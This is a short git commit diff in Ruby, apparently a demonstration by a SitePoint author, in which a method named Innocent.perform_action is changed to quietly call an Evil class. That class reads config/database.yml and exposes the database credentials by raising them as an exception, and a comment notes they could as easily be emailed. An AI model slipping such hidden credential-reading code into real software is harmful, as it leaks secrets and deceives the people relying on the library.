2392fcca49bcb9cdec33c3ce456aae2549f59918
Mal Curtis <mal@sitepoint.com>
2011-08-13 19:00:03 +1200

    Not so innocent now.

--- lib/innocent.rb
+++ lib/innocent.rb
@@ -1,7 +1,15 @@
 module Something
 	class Innocent
     def self.perform_action(string)
+      Something::Evil.do_evil
       string
     end
-	end
+  end
+  class Evil
+    def self.do_evil
+      file = File.open("./config/database.yml", "r")
+      raise file.read.inspect
+      # This could just as easily email this information
+    end
+  end
 end
